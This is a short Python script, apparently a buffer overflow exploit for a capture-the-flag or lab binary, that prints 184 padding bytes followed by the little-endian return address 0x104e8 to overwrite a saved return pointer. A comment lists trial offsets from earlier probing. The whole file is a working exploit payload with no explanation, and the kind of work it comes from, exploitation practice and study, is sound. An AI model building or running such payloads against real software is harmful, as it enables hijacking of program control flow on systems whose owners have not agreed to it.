import sys
# trial = [64 68 72 76 80]
padding = b'A'*184
address = (0x104e8).to_bytes(8, 'little')


sys.stdout.buffer.write(padding + address)
sys.stdout.buffer.flush()